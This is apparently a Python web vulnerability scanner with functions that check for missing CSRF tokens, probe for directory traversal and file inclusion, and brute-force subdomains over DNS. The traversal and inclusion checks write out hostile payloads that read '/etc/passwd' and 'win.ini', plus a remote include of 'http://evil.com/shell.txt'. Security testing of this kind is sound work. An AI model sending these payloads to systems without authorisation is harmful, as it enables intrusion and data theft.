import re
import urllib.parse
import logging
from bs4 import BeautifulSoup
import requests
import dns.resolver

def check_csrf(url, session):
    """
    CSRF vulnerability check:
    - Parse page for forms.
    - Check if any form has a hidden input with 'csrf' or 'token' in its name.
    
    Returns:
        List of vulnerability dictionaries. Empty list if none found.
    """
    vulnerabilities = []
    try:
        response = session.get(url, timeout=10)
    except requests.exceptions.ReadTimeout:
        logging.warning(f"Timeout occurred while checking CSRF for {url}")
        return vulnerabilities
    except Exception as e:
        logging.exception(f"Error checking CSRF for {url}: {e}")
        return vulnerabilities

    try:
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            hidden_inputs = form.find_all("input", type="hidden")
            csrf_present = any(
                "csrf" in inp.get("name", "").lower() or "token" in inp.get("name", "").lower()
                for inp in hidden_inputs
            )
            if not csrf_present:
                vuln = {
                    "url": url,
                    "type": "Potential CSRF Vulnerability",
                    "details": "Form missing CSRF token."
                }
                vulnerabilities.append(vuln)
    except Exception as e:
        logging.exception(f"Error processing CSRF for {url}: {e}")
    return vulnerabilities

def check_directory_traversal(url, session):
    """
    Directory Traversal Check:
    - For parameters like file, path, or document, inject traversal payloads.
    
    Returns:
        List of vulnerability dictionaries. Empty list if none found.
    """
    vulnerabilities = []
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs:
            return vulnerabilities
        # Expanded payload list for directory traversal
        traversal_payloads = [
            "../../../../etc/passwd", 
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../boot.ini",  
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        for param, values in qs.items():
            if any(keyword in param.lower() for keyword in ["file", "path", "document"]):
                original_value = values[0]
                for payload in traversal_payloads:
                    new_query = parsed.query.replace(f"{param}={original_value}", f"{param}={payload}")
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    try:
                        response = session.get(test_url, timeout=10)
                    except requests.exceptions.ReadTimeout:
                        logging.warning(f"Timeout during directory traversal check for {test_url}")
                        continue
                    if re.search(r"root:|/bin/", response.text, re.IGNORECASE):
                        vuln = {
                            "url": test_url,
                            "type": "Directory Traversal Vulnerability",
                            "parameter": param,
                            "payload": payload
                        }
                        vulnerabilities.append(vuln)
                        break  # Stop further payloads for this parameter once a vulnerability is found
    except Exception as e:
        logging.exception(f"Error checking directory traversal for {url}: {e}")
    return vulnerabilities

def check_file_inclusion(url, session):
    """
    File Inclusion Vulnerability Check:
    - For parameters like file, page, or template, try payloads that attempt to include
      local or remote files.
    
    Returns:
        List of vulnerability dictionaries. Empty list if none found.
    """
    vulnerabilities = []
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs:
            return vulnerabilities
        # Expanded payload list for file inclusion
        payloads = [
            "../../../../etc/passwd", 
            "http://evil.com/shell.txt",
            "../etc/passwd",  
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        for param, values in qs.items():
            if any(keyword in param.lower() for keyword in ["file", "page", "template"]):
                original_value = values[0]
                for payload in payloads:
                    new_query = parsed.query.replace(f"{param}={original_value}", f"{param}={payload}")
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    try:
                        response = session.get(test_url, timeout=10)
                    except requests.exceptions.ReadTimeout:
                        logging.warning(f"Timeout during file inclusion check for {test_url}")
                        continue
                    if re.search(r"root:|<html>", response.text, re.IGNORECASE):
                        vuln = {
                            "url": test_url,
                            "type": "File Inclusion Vulnerability",
                            "parameter": param,
                            "payload": payload
                        }
                        vulnerabilities.append(vuln)
                        break  # Stop trying further payloads for this parameter
    except Exception as e:
        logging.exception(f"Error checking file inclusion for {url}: {e}")
    return vulnerabilities

def subdomain_scan(domain, subdomains_file="subdomains.txt"):
    """
    Subdomain scanning using a list of common subdomain prefixes.
    
    Parameters:
        domain (str): The primary domain to scan.
        subdomains_file (str): Path to a file containing subdomain prefixes.
    
    Returns:
        List of dictionaries with discovered subdomains and their IP addresses.
    """
    discovered = []
    resolver = dns.resolver.Resolver()
    try:
        with open(subdomains_file, "r") as f:
            prefixes = f.read().splitlines()
        for prefix in prefixes:
            subdomain = f"{prefix}.{domain}"
            try:
                answers = resolver.resolve(subdomain, 'A')
                ips = [rdata.to_text() for rdata in answers]
                discovered.append({"subdomain": subdomain, "ips": ips})
            except Exception:
                continue
    except Exception as e:
        logging.exception(f"Error reading subdomains file: {e}")
    return discovered
